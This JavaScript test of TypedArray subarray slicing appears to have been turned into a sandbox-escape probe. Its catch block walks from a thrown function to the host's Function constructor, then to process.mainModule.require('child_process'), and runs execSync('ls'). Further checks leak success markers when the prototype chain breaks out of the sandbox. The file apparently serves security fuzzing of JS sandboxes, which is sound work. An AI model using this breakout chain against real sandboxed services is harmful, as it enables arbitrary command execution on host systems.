try {
    testWithTypedArrayConstructors(function (TA) {
        throw () => {
            return () => {
            };
        };
        var sample = new TA([
            40,
            41,
            42,
            43
        ]);
        function testRes(result, expected, msg) {
            assert(compareArray(result, expected), msg + ', result: [' + result + ']');
        }
        testRes(sample.subarray(1), [
            41,
            42,
            43
        ], 'begin == 1');
        testRes(sample.subarray(2), [
            42,
            43
        ], 'begin == 2');
        testRes(sample.subarray(3), [43], 'begin == 3');
        testRes(sample.subarray(1, 4), [
            41,
            42,
            43
        ], 'begin == 1, end == length');
        testRes(sample.subarray(2, 4), [
            42,
            43
        ], 'begin == 2, end == length');
        testRes(sample.subarray(3, 4), [43], 'begin == 3, end == length');
        testRes(sample.subarray(0, 1), [40], 'begin == 0, end == 1');
        testRes(sample.subarray(0, 2), [
            40,
            41
        ], 'begin == 0, end == 2');
        testRes(sample.subarray(0, 3), [
            40,
            41,
            42
        ], 'begin == 0, end == 3');
        testRes(sample.subarray(-1), [43], 'begin == -1');
        testRes(sample.subarray(-2), [
            42,
            43
        ], 'begin == -2');
        testRes(sample.subarray(-3), [
            41,
            42,
            43
        ], 'begin == -3');
        testRes(sample.subarray(-1, 4), [43], 'begin == -1, end == length');
        testRes(sample.subarray(-2, 4), [
            42,
            43
        ], 'begin == -2, end == length');
        testRes(sample.subarray(-3, 4), [
            41,
            42,
            43
        ], 'begin == -3, end == length');
        testRes(sample.subarray(0, -1), [
            40,
            41,
            42
        ], 'begin == 0, end == -1');
        testRes(sample.subarray(0, -2), [
            40,
            41
        ], 'begin == 0, end == -2');
        testRes(sample.subarray(0, -3), [40], 'begin == 0, end == -3');
        testRes(sample.subarray(-0, -1), [
            40,
            41,
            42
        ], 'begin == -0, end == -1');
        testRes(sample.subarray(-0, -2), [
            40,
            41
        ], 'begin == -0, end == -2');
        testRes(sample.subarray(-0, -3), [40], 'begin == -0, end == -3');
        testRes(sample.subarray(-2, -1), [42], 'length == 4, begin == -2, end == -1');
        testRes(sample.subarray(1, -1), [
            41,
            42
        ], 'length == 4, begin == 1, end == -1');
        testRes(sample.subarray(1, -2), [41], 'length == 4, begin == 1, end == -2');
        testRes(sample.subarray(2, -1), [42], 'length == 4, begin == 2, end == -1');
        testRes(sample.subarray(-1, 5), [43], 'begin == -1, end > length');
        testRes(sample.subarray(-2, 4), [
            42,
            43
        ], 'begin == -2, end > length');
        testRes(sample.subarray(-3, 4), [
            41,
            42,
            43
        ], 'begin == -3, end > length');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}